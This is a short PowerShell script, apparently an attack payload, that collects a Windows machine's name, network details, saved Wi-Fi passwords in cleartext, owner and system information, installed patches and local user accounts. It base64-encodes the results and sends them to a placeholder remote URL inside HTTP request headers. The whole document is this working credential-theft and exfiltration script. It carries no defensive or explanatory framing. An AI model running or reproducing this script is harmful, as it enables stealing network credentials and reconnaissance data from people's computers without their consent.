$xhost = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($env:computername)); $ipinfo = get-netipaddress | where PrefixOrigin -EQ DHCP | Out-String ; $xipinfo = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($ipinfo)); $wifi = (netsh wlan show profiles) | Select-String “\:(.+)$” | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=”$name” key=clear)}  | Select-String “Key Content\W+\:(.+)$” | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }}| Out-String ; $xwifi = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($wifi)); $compinfo = get-computerinfo | format-list -Property WindowsRegisteredOrganization,WindowsRegisteredOwner,CsDNSHostName,CsDomain,CsUserName,CsManufacturer,CsModel,CsName,OsVersion,BIOSVersion,BiosSeralNumber | out-string; $xcompinfo = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($compinfo)); $patchlvl = get-hotfix | select-object -Property HotFixID | Out-string; $xpatchlvl = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($patchlvl)); <# This one is currently broken $service = Get-Service | Where-Object {$_.Status -eq "Running"} | Sort-Object name | select-object name | out-string; $xservice = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($service));#> $localusr = get-localuser | Out-string; $xlocalusr = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($localusr)); invoke-webrequest -uri https://CHANGEME -Headers @{ 'X-Host' = $xhost; 'X-IPInfo' = $xipinfo; 'X-WiFi' = $xwifi; 'X-CompInfo' = $xcompinfo; 'X-PatchLvl' = $xpatchlvl; 'X-Services' = $xservice; 'X-LocalUser' = $xlocalusr } -method get
